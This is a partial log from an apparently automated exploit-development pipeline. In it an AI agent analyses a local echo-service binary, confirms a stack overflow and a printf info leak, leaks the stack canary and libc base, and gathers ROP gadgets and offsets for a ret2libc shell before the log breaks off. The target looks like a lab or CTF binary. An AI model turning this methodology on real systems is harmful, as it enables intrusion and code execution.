19:18:18 [impact:BUG-001] ← GLM(3.0s): 调工具[delete, delete, delete]
19:18:18 [impact:BUG-001] 两个原语均已通过动态证据验证。现在让我清理临时文件并完成最终工作。
19:18:18 [impact:BUG-001]   → 工具 delete({"file_path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001-gdb.py"})
19:18:18 [impact:BUG-001]   → 工具 delete({"file_path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/payload_overflow_canary.bin"})
19:18:18 [impact:BUG-001]   → 工具 delete({"file_path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/payload_gdb_test.bin"})
19:18:18 [impact:BUG-001]   ← delete(0.0s): Deleted /work/workspace/0009-2021-29-cooldown-20260905-190810/payload_overflow_canary.bin
19:18:18 [impact:BUG-001]   ← delete(0.0s): Deleted /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001-gdb.py
19:18:18 [impact:BUG-001]   ← delete(0.0s): Deleted /work/workspace/0009-2021-29-cooldown-20260905-190810/payload_gdb_test.bin
19:18:18 [impact:BUG-001] → 调用 GLM...
19:18:20 [impact:BUG-001] ← GLM(1.8s): 调工具[ls]
19:18:20 [impact:BUG-001] 现在让我验证一下 PoC 文件是否存在于预期的路径中：
19:18:20 [impact:BUG-001]   → 工具 ls({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810"})
19:18:20 [impact:BUG-001]   ← ls(0.0s): ['/work/workspace/0009-2021-29-cooldown-20260905-190810/core.12932', '/work/workspace/0009-2021-29-cooldown-20260905-190810/core.12933', '/work/worksp...(1092 chars)
19:18:20 [impact:BUG-001] → 调用 GLM...
19:18:23 [impact:BUG-001] ← GLM(3.6s): 调工具[execute]
19:18:23 [impact:BUG-001] 很好，`poc-BUG-001.py` 已存在。让我清理一下核心转储文件。
19:18:23 [impact:BUG-001]   → 工具 execute({"command": "rm -f /work/workspace/0009-2021-29-cooldown-20260905-190810/core.*"})
19:18:23 [impact:BUG-001]   ← execute(0.0s): <no output> ⏎ [Command succeeded with exit code 0]
19:18:23 [impact:BUG-001] → 调用 GLM...
19:19:38 [impact:BUG-001] ← GLM(74.8s): 调工具[submit_final_result]
19:19:38 [impact:BUG-001] 现在我已经掌握了所有证据。让我来汇总最终报告。以下是我的分析总结：  **BUG-001: STACK_BUFFER_OVERFLOW**  **PRIM-001: STACK_CONTROL (已验证)** - 链条：BUG-001 → read(0, rbp-0x70, 0x100) 写入 25
19:19:38 [impact:BUG-001] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，20423 chars）
19:19:38 [impact:BUG-001] → 调用 GLM...
19:19:46 [impact:BUG-001] ← GLM(7.3s)
19:19:46 [impact:BUG-001] BUG-001 的 S3 Primitive 分析与验证已完成。以下是验证内容的总结：  **BUG-001: STACK_BUFFER_OVERFLOW** — `read(0, rbp-0x70, 0x100)` 将 256 字节写入 112 字节的栈缓冲区中。  **PRIM-001: STA
19:19:46 === impact (bug_id=BUG-002) ===
19:19:46 [impact:BUG-002] → 调用 GLM...
19:19:49 [impact:BUG-002] ← GLM(3.1s): 调工具[disassemble, probe_io]
19:19:49 [impact:BUG-002] 我将分析 BUG-002（通过 printf 导致的栈信息泄露）。让我先理解该漏洞的机制，然后构建并验证一个 PoC。  让我先检查一下二进制文件的反汇编代码，以了解确切的代码路径。
19:19:49 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "function": "main", "lines": 100})
19:19:49 [impact:BUG-002]   → 工具 probe_io({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "steps": "[{\"recv_until\": \"Welcome\", \"send\": \"\"}, {\"recv_until\": )
19:19:49 [impact:BUG-002]   ← disassemble(0.0s): 0000000000001200 <main>: ⏎     1200:	push   rbp ⏎     1201:	mov    rbp,rsp ⏎     1204:	add    rsp,0xffffffffffffff80 ⏎     1208:	mov    rax,QWORD PTR ...(1975 chars)
19:19:52 [impact:BUG-002]   ← probe_io(3.4s): RECV: b'Welcome' ⏎ RECV: b'' ⏎ SEND: 'AAAA' ⏎ RECV_TAIL: b' to echo service.\n'
19:19:52 [impact:BUG-002] → 调用 GLM...
19:19:55 [impact:BUG-002] ← GLM(2.5s): 调工具[probe_io]
19:19:55 [impact:BUG-002] 探测结果不太理想。让我尝试用更合适的方法来理解 I/O 时序。
19:19:55 [impact:BUG-002]   → 工具 probe_io({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "input": "AAAA\nN\n"})
19:19:55 [impact:BUG-002]   ← probe_io(0.0s): 00000000: 5765 6c63 6f6d 6520 746f 2065 6368 6f20  Welcome to echo  ⏎ 00000010: 7365 7276 6963 652e 0a41 4141 410a 4e0a  service..AAAA.N. ⏎ 00000020: ...(2800 chars)
19:19:55 [impact:BUG-002] → 调用 GLM...
19:20:04 [impact:BUG-002] ← GLM(9.3s): 调工具[gdb_run]
19:20:04 [impact:BUG-002] 有趣！我注意到在 "AAAA\n" 之后，输出中出现了字节 `0a 58 4d c5 75 fe 7f`。这看起来像是泄露的栈数据。`0a` 是换行符，后面跟着 `58 4d c5 75 fe 7f`，这可能是栈地址或 canary 的一部分。让我更仔细地研究一下。  关键观察：当发送 "AAAA\
19:20:04 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0x48; run; x/40bx $rbp-0x70; x/8gx $rbp-0x70; info reg)
19:20:04 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x1248 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(795 chars)
19:20:04 [impact:BUG-002] → 调用 GLM...
19:20:07 [impact:BUG-002] ← GLM(3.3s): 调工具[gdb_run]
19:20:07 [impact:BUG-002] 现在让我看看缓冲区布局。缓冲区位于 `rbp-0x70` = `0x7fffffffeb00`。Canary 位于 `rbp-0x8` = `0x7fffffffeb68`。让我看看完整的栈帧，包括 Canary。
19:20:07 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0x48; run; x/20gx $rbp-0x70; print/x $rbp-0x70; print/)
19:20:08 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x1248 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(855 chars)
19:20:08 [impact:BUG-002] → 调用 GLM...
19:20:29 [impact:BUG-002] ← GLM(21.8s): 调工具[run_binary]
19:20:29 [impact:BUG-002] 现在我已经掌握了完整的布局：  - 缓冲区起始 (`rbp-0x70`) = `0x7fffffffeb00` - Canary (`rbp-0x8`) = `0x7fffffffeb68`，值 = `0x67ba88f93bf15a00` - 保存的 rbp (`rbp`) = `0x7fffff
19:20:29 [impact:BUG-002]   → 工具 run_binary({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "stdin": "AAAA\nN\n", "timeout": 5})
19:20:35 [impact:BUG-002]   ← run_binary(5.2s): rc=-124  stdout_len=71179236  [TRUNCATED to 1500] ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  57 65 6c 63 6f 6d 65 20 74 6f 20 65 63 68 6f ...(7290 chars)
19:20:35 [impact:BUG-002] → 调用 GLM...
19:21:24 [impact:BUG-002] ← GLM(49.6s): 调工具[write_file]
19:21:24 [impact:BUG-002] 程序陷入了死循环，因为 "N" 会使其继续执行。我之前看到的 `probe_io` 输出显示了 `0a 58 4d c5 75 fe 7f` 字节——那是在不同的运行环境下产生的。让我更仔细地分析一下。  关键点在于：当发送 "AAAA\n"（5 字节）时，`read` 返回 5。代码检查 `buf
19:21:24 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-002: STACK_INFO_LEAK_VIA_PRINTF\n\nThe vulnerability: After read() fills the echo buffer at r)
19:21:24 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002.py
19:21:24 [impact:BUG-002] → 调用 GLM...
19:21:27 [impact:BUG-002] ← GLM(3.3s): 调工具[run_script]
19:21:27 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002.py", "timeout": 30})
19:21:28 [impact:BUG-002]   ← run_script(0.1s): rc=1 ⏎ --- stdout (summarized) --- ⏎ (empty) ⏎ --- stderr (summarized) --- ⏎   File "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002...(264 chars)
19:21:28 [impact:BUG-002] → 调用 GLM...
19:21:51 [impact:BUG-002] ← GLM(23.2s): 调工具[write_file]
19:21:51 [impact:BUG-002] 我需要修复导入结构。让我重写脚本，将所有导入放在模块级别。
19:21:51 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-002: STACK_INFO_LEAK_VIA_PRINTF\n\nThe vulnerability: After read() fills the echo buffer at r)
19:21:51 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002.py
19:21:51 [impact:BUG-002] → 调用 GLM...
19:21:54 [impact:BUG-002] ← GLM(2.9s): 调工具[run_script]
19:21:54 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002.py", "timeout": 60})
19:21:56 [impact:BUG-002]   ← run_script(2.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ BUG-002: STACK_INFO_LEAK_VIA_PRINTF - Primitive Ve...(2890 chars)
19:21:56 [impact:BUG-002] → 调用 GLM...
19:22:08 [impact:BUG-002] ← GLM(12.7s): 调工具[gdb_run]
19:22:08 [impact:BUG-002] 太棒了！这是一个非常令人惊讶的发现！让我来分析一下结果：  1. **长度 105**：发送 105 字节时，`echo_len=118`，这意味着 `printf` 读取了 118 字节——超出了 105 字节的输入！偏移量 104 处的 canary 区域有 14 个非零字节。这意味着 **ca
19:22:08 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0x7b; run; x/20gx $rbp-0x70; x/gx $rbp-0x8; printf \"c)
19:22:09 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x127b ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(923 chars)
19:22:09 [impact:BUG-002] → 调用 GLM...
19:22:22 [impact:BUG-002] ← GLM(13.1s): 调工具[gdb_run]
19:22:22 [impact:BUG-002] 现在我可以看到在 `printf` 断点处的缓冲区状态：  - `buf[0..7]` = `0x4141414141414141` (我们的 8 个 'A') - `buf[8..15]` = `0x00007fffff0a4e0a` - 这是栈残留数据！   - 字节：`0a 4e 0a ff 
19:22:22 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0x7b; run; x/20gx $rbp-0x70; printf \"canary_orig = 0x)
19:22:22 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x127b ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1017 chars)
19:22:22 [impact:BUG-002] → 调用 GLM...
19:23:00 [impact:BUG-002] ← GLM(38.0s): 调工具[write_file]
19:23:00 [impact:BUG-002] 等等，这很有趣。输入是 105 个 'B' 加上 "\nN\n"。`read()` 读取了全部 108 个字节。所以： - `buf[0..104]` = 105 个 'B' (0x42) - `buf[105]` = `\n` (0x0a) - `buf[106]` = 'N' (0x4e) - 
19:23:00 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-002: STACK_INFO_LEAK_VIA_PRINTF\n\nVulnerability: After read() fills the echo buffer at rbp-0)
19:23:00 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002.py
19:23:00 [impact:BUG-002] → 调用 GLM...
19:23:03 [impact:BUG-002] ← GLM(2.7s): 调工具[run_script]
19:23:03 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002.py", "timeout": 60})
19:23:04 [impact:BUG-002]   ← run_script(1.5s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ====================================================================== ⏎ BUG-002: STACK_INFO_LEAK_VIA_PRINTF - Pr...(3227 chars)
19:23:04 [impact:BUG-002] → 调用 GLM...
19:23:12 [impact:BUG-002] ← GLM(8.3s): 调工具[gdb_run]
19:23:12 [impact:BUG-002] 两个原语均已验证。让我来分析一下关键发现：  **PRIM-001 (INFO_LEAK - 直接)**：当发送 8 字节输入（无换行符）时，`printf` 会泄露 6 字节的栈残留数据，包括 `fc7f`，这是栈指针的一部分（`0x7ffc...`）。在长度为 96 时，泄露了 `ff7f` —
19:23:12 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0x7b; run; printf \"=== GDB CANARY VERIFICATION ===\\n)
19:23:13 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x127b ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(504 chars)
19:23:13 [impact:BUG-002] → 调用 GLM...
19:23:50 [impact:BUG-002] ← GLM(37.1s): 调工具[write_file]
19:23:50 [impact:BUG-002] 我明白了——输入 "BBBBB...BBB\nN\n"（105 个 B + "\nN\n" = 108 字节）覆盖了 `buf[104..107]`。`buf[104]` = 0x42 ('B')，`buf[105]` = 0x42 ('B')，`buf[106]` = 0x42 ('B')，`bu
19:23:50 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-002: STACK_INFO_LEAK_VIA_PRINTF\n\nVulnerability: After read() fills the echo buffer at rbp-0)
19:23:50 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002.py
19:23:50 [impact:BUG-002] → 调用 GLM...
19:23:52 [impact:BUG-002] ← GLM(2.0s): 调工具[run_script]
19:23:52 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002.py", "timeout": 60})
19:23:53 [impact:BUG-002]   ← run_script(1.5s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ====================================================================== ⏎ BUG-002: STACK_INFO_LEAK_VIA_PRINTF - Pr...(3229 chars)
19:23:53 [impact:BUG-002] → 调用 GLM...
19:24:21 [impact:BUG-002] ← GLM(28.2s): 调工具[gdb_run]
19:24:21 [impact:BUG-002] 两个原语均已通过动态证据验证。让我来分析一下关键发现：  **PRIM-001 (INFO_LEAK - 直接)**：已验证。当发送 8 字节（无换行符）时，`printf` 泄露了 6 字节的栈残留数据，包括 `fd7f`，这是栈指针的一部分（`0x7ffd...`）。在长度为 96 时，泄露了 
19:24:21 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0x48; run; printf \"=== CANARY BEFORE READ ===\\n\"; p)
19:24:22 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x1248 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(446 chars)
19:24:22 [impact:BUG-002] → 调用 GLM...
19:24:31 [impact:BUG-002] ← GLM(9.7s): 调工具[execute]
19:24:31 [impact:BUG-002] 现在我可以确认：canary 的值是 `0xb8c927da5302f300`。字节 [105..111]（canary 字节 2-8）是 `f3 02 53 da 27 c9 b8`。canary 的 LSB（字节 104）是 `0x00`。  在 PoC 运行中，当发送 105 个 'A' 时，
19:24:31 [impact:BUG-002]   → 工具 execute({"command": "ls -la /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002.py"})
19:24:31 [impact:BUG-002]   ← execute(0.0s): -rwxrwxrwx 1 ubuntu ubuntu 10974 Sep  5 19:23 /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-002.py ⏎  ⏎ [Command succeeded with exit c...(156 chars)
19:24:31 [impact:BUG-002] → 调用 GLM...
19:25:44 [impact:BUG-002] ← GLM(72.8s): 调工具[submit_final_result]
19:25:44 [impact:BUG-002] 很好，PoC 文件已存在。现在让我来汇总最终分析：  **BUG-002 的分析总结：**  1. **PRIM-001: INFO_LEAK (直接, 已验证)**    - BUG：`printf("%s")` 在一个可能未以 null 结尾的缓冲区上被调用    - 根本原因：条件性 null
19:25:44 [impact:BUG-002] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，19453 chars）
19:25:44 [impact:BUG-002] → 调用 GLM...
19:25:54 [impact:BUG-002] ← GLM(9.7s)
19:25:54 [impact:BUG-002] BUG-002 的 S3 Primitive 分析与验证已完成。以下是工作总结：  ## BUG-002: STACK_INFO_LEAK_VIA_PRINTF - S3 结果  ### 发现两个 Primitive（均已验证）：  **PRIM-001: INFO_LEAK (直接, 已验证)**
19:25:54 [stage3] 保存 → /work/workspace/0009-2021-29-cooldown-20260905-190810/stage3.json
19:25:54 --- S4 Exploit ---
19:25:54 === exploit (bug_id=-) ===
19:25:54 [exploit] → 调用 GLM...
19:26:02 [exploit] ← GLM(7.5s): 调工具[read_file, disassemble]
19:26:02 [exploit] 我将首先分析 S1/S2/S3 报告，然后加载相关的技能文件。  **S1/S2/S3 分析的关键发现：** - 栈缓冲区溢出（BUG-001）：read(0, rbp-0x70, 0x100) 写入 112 字节缓冲区，覆盖偏移量 104 处的 canary，偏移量 112 处的 saved_rb
19:26:02 [exploit]   → 工具 read_file({"file_path": "/work/leanagent/skills/rop-ret2libc/SKILL.md", "limit": 1000})
19:26:02 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "function": "main", "lines": 200})
19:26:02 [exploit]   ← read_file(0.0s):  1  --- ⏎  2  name: rop-ret2libc ⏎  3  description: 栈溢出→RIP Control→ROP链/ret2libc/SROP拿shell。通用方法论。 ⏎  4  --- ⏎  5   ⏎  6  # ROP / ret2libc / SROP ⏎  ...(1300 chars)
19:26:02 [exploit]   ← disassemble(0.0s): 0000000000001200 <main>: ⏎     1200:	push   rbp ⏎     1201:	mov    rbp,rsp ⏎     1204:	add    rsp,0xffffffffffffff80 ⏎     1208:	mov    rax,QWORD PTR ...(1975 chars)
19:26:02 [exploit] → 调用 GLM...
19:26:10 [exploit] ← GLM(8.5s): 调工具[probe_io, search_rop_gadgets]
19:26:10 [exploit] 好的。现在让我来理解一下泄露机制。关键点在于：  1. **Canary 泄露**：发送 105 字节（无换行符）→ 覆盖偏移量 104 处的 canary 空字节最低有效位 (LSB) → `printf("%s")` 读取 canary 字节 1-7（偏移量 105-111）。但 canary 
19:26:10 [exploit]   → 工具 probe_io({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "steps": "[{\"recv_until\": \"End?[Y/N]\", \"send\": \"AAAAAAAAAAAAAAAAAAAA)
19:26:10 [exploit]   → 工具 search_rop_gadgets({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "keyword": "pop rdi", "max_results": 20})
19:26:10 [exploit]   ← search_rop_gadgets(0.2s): 0x000000000000133b : pop rdi ; ret
19:26:14 [exploit]   ← probe_io(3.4s): RECV: b'' ⏎ SEND: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' ⏎ RECV: b'Welcome to ech...(345 chars)
19:26:14 [exploit] → 调用 GLM...
19:27:09 [exploit] ← GLM(55.9s): 调工具[gdb_run]
19:27:09 [exploit] 太棒了！我可以看到泄露信息了。让我分析一下：  - 发送了 105 个 'A' (0x41) - 回显输出：105 个 'A' + 泄露的字节：`u\xbd\x88G\xaf\xe9\x80j\x08U\xfe\x7f` - 在偏移量 104 处：0x41（覆盖了 canary 的 LSB） - 偏
19:27:09 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0xd7; b *main+0x48; run; x/3gx $rbp-0x8; x/i *(long*)()
19:27:10 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x12d7 ⏎ Breakpoint 2 at 0x1248 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-g...(3071 chars)
19:27:10 [exploit] → 调用 GLM...
19:27:16 [exploit] ← GLM(6.2s): 调工具[libc_offsets, identify_libc]
19:27:16 [exploit] 我现在可以看到关键信息了：  - Canary 位于 `rbp-0x8`：`0x8b105e5a981a8100` (LSB = 0x00，符合预期) - Saved rbp：`0x00007fffffffec10` - 返回地址：`0x00007ffff7dcd1ca` — 这是 libc 中的一
19:27:16 [exploit]   → 工具 libc_offsets({"libc_path": "/lib/x86_64-linux-gnu/libc.so.6", "symbols": "__libc_start_main,__libc_start_call_main,system,puts,printf,read,__isoc99_scanf"})
19:27:16 [exploit]   → 工具 identify_libc({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target"})
19:27:16 [exploit]   ← identify_libc(0.1s): 	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x000070c9f6507000) ⏎ ===LIBC VERSION=== ⏎ GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.8) stable release ...(166 chars)
19:27:16 [exploit]   ← libc_offsets(0.2s): {"__libc_start_main": "0x2a200", "system": "0x58750", "puts": "0x87cc0", "printf": "0x60100", "read": "0x11bb80", "__isoc99_scanf": "0x5fe10"}
19:27:16 [exploit] → 调用 GLM...
19:27:23 [exploit] ← GLM(6.6s): 调工具[execute, execute]
19:27:23 [exploit] 返回地址偏移量为 `0x2a1ca`。`__libc_start_main` 的偏移量为 `0x2a200`。因此，返回地址为 `__libc_start_main + 0x2a1ca - 0x2a200 = __libc_start_main - 0x36`。嗯，这不太对。让我检查一下 `__li
19:27:23 [exploit]   → 工具 execute({"command": "objdump -d /lib/x86_64-linux-gnu/libc.so.6 --start-address=0x2a1c0 --stop-address=0x2a1d0 -M intel 2>/dev/null | head -20"})
19:27:23 [exploit]   → 工具 execute({"command": "nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -E \"start_call|start_main\""})
19:27:23 [exploit]   ← execute(0.0s): 000000000002a200 T __libc_start_main@@GLIBC_2.34 ⏎ 000000000002a200 T __libc_start_main@GLIBC_2.2.5 ⏎  ⏎ [Command succeeded with exit code 0]
19:27:23 [exploit]   ← execute(0.0s):  ⏎ /lib/x86_64-linux-gnu/libc.so.6:     file format elf64-x86-64 ⏎  ⏎  ⏎ Disassembly of section .text: ⏎  ⏎ 000000000002a1c0 <__libc_init_first@@GLIBC...(497 chars)
19:27:23 [exploit] → 调用 GLM...
19:27:27 [exploit] ← GLM(4.4s): 调工具[execute, execute]
19:27:27 [exploit] 反汇编看起来不对，因为起始地址没有与指令边界对齐。让我检查一下 `__libc_start_call_main`：
19:27:27 [exploit]   → 工具 execute({"command": "nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep \"call_main\""})
19:27:27 [exploit]   → 工具 execute({"command": "objdump -d /lib/x86_64-linux-gnu/libc.so.6 -M intel --no-show-raw-insn 2>/dev/null | grep -A5 \"2a1c\" | head -20"})
19:27:27 [exploit]   ← execute(0.0s): <no output> ⏎  ⏎ Exit code: 1 ⏎ [Command failed with exit code 1]
19:27:27 [exploit]   ← execute(0.5s):    2a1c1:	mov    rdx,QWORD PTR [rax] ⏎    2a1c4:	mov    rax,QWORD PTR [rbp-0x78] ⏎    2a1c8:	call   rax ⏎    2a1ca:	mov    edi,eax ⏎    2a1cc:	call   ...(808 chars)
19:27:27 [exploit] → 调用 GLM...
19:27:38 [exploit] ← GLM(11.0s): 调工具[write_file]
19:27:38 [exploit] 现在我可以看到返回地址 `0x2a1ca` 是 `call rax`（调用 main 函数）之后的指令。这是 `__libc_start_call_main` 内部的代码（被标记为 `__libc_init_first+0x8a`）。`0x2a1ca` 处的指令是 `mov edi, eax`，随后
19:27:38 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\ncontext.log_level = 'debug'\n\np = process('./target')\n\n# Wait for)
19:27:38 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/test_leak.py
19:27:38 [exploit] → 调用 GLM...
19:27:40 [exploit] ← GLM(1.9s): 调工具[run_script]
19:27:40 [exploit]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/test_leak.py", "timeout": 15})
19:27:55 [exploit]   ← run_script(15.0s): rc=-124 ⏎ --- stdout (summarized) --- ⏎ [+] Starting local process './target' argv=[b'./target'] : pid 13231 ⏎ [DEBUG] Received 0x19 bytes: ⏎     b'We...(1090 chars)
19:27:55 [exploit] → 调用 GLM...
19:28:07 [exploit] ← GLM(11.3s): 调工具[write_file]
19:28:07 [exploit] 第一次迭代运行正常。Canary 已泄露：`0x37dab8fee8fac500`。但脚本在第二次迭代时卡住了。问题在于在发送 `N` 后，程序期望进行下一次 `read()` 调用。让我检查一下 I/O 时序。  查看调试输出，在发送 105 个字节后，我收到了回显 + `End?[Y/N] `。
19:28:07 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\ncontext.log_level = 'debug'\n\np = process('./target')\n\n# Wait for)
19:28:07 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/test_leak.py
19:28:07 [exploit] → 调用 GLM...
19:28:10 [exploit] ← GLM(3.0s): 调工具[run_script]
19:28:10 [exploit]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/test_leak.py", "timeout": 15})
19:28:10 [exploit]   ← run_script(0.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [+] Starting local process './target' argv=[b'./target'] : pid 13234 ⏎ [DEBUG] Received 0x19 bytes: ⏎     b'Welco...(1379 chars)
19:28:10 [exploit] → 调用 GLM...
19:28:17 [exploit] ← GLM(7.1s): 调工具[search_rop_gadgets, search_rop_gadgets]
19:28:17 [exploit] 两次泄露均成功： - Canary: `0xcfe00dd9b077d000` (LSB = 0x00 ✓) - 返回地址: `0x7e8cf6a991ca` → libc 基址 = `0x7e8cf6a6f000` (& 0xfff == 0 ✓)  libc 基址已正确对齐（以 0x000 结尾
19:28:17 [exploit]   → 工具 search_rop_gadgets({"binary": "/lib/x86_64-linux-gnu/libc.so.6", "keyword": "pop rdi ; ret", "max_results": 5})
19:28:17 [exploit]   → 工具 search_rop_gadgets({"binary": "/lib/x86_64-linux-gnu/libc.so.6", "keyword": "ret", "max_results": 5})
19:28:19 [exploit]   ← search_rop_gadgets(2.4s): 0x000000000019967d : adc ah, bh ; ret ⏎ 0x0000000000064909 : adc ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; retf 0xf66 ⏎ 0x00000000000bb1a...(352 chars)
19:28:21 [exploit]   ← search_rop_gadgets(3.7s): 0x000000000010c08d : pop rdi ; ret ⏎ 0x0000000000126395 : pop rdi ; retf 0xd
19:28:21 [exploit] → 调用 GLM...
19:28:23 [exploit] ← GLM(2.4s): 调工具[search_rop_gadgets]
19:28:23 [exploit] 我在 libc 中找到了 `pop rdi; ret`，地址为 `0x10c08d`。现在我需要一个单独的 `ret` gadget 来进行栈对齐。让我找一个：
19:28:23 [exploit]   → 工具 search_rop_gadgets({"binary": "/lib/x86_64-linux-gnu/libc.so.6", "keyword": "ret", "max_results": 50})
19:28:27 [exploit]   ← search_rop_gadgets(4.3s): 0x000000000019967d : adc ah, bh ; ret ⏎ 0x0000000000064909 : adc ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; retf 0xf66 ⏎ 0x00000000000bb1a...(5149 chars)
19:28:28 [exploit] → 调用 GLM...
19:28:31 [exploit] ← GLM(3.7s): 调工具[find_ret_gadget, list_strings]
19:28:31 [exploit] 让我找一个更简单的 `ret` gadget：
19:28:31 [exploit]   → 工具 find_ret_gadget({"binary": "/lib/x86_64-linux-gnu/libc.so.6"})
19:28:31 [exploit]   → 工具 list_strings({"binary": "/lib/x86_64-linux-gnu/libc.so.6", "filter": "/bin/sh"})
19:28:31 [exploit]   ← list_strings(0.0s): /bin/sh ⏎ 
19:28:35 [exploit]   ← find_ret_gadget(3.9s): [{"addr": "0x000000000002882f", "insn": "ret"}]
19:28:35 [exploit] → 调用 GLM...
19:28:39 [exploit] ← GLM(3.8s): 调工具[execute]
19:28:39 [exploit] 我已经准备好所有必要的 gadgets： - `pop rdi; ret` 位于 libc 偏移 `0x10c08d` - `ret` 位于 libc 偏移 `0x2882f` (用于栈对齐) - `system` 位于 libc 偏移 `0x58750` - `/bin/sh` 字符串 - 需要找
19:28:39 [exploit]   → 工具 execute({"command": "strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep \"/bin/sh\""})
19:28:39 [exploit]   ← execute(0.0s):  1cb42f /bin/sh ⏎  ⏎ [Command succeeded with exit code 0]
19:28:39 [exploit] → 调用 GLM...
19:29:12 [exploit] ← GLM(32.6s): 调工具[gdb_run]
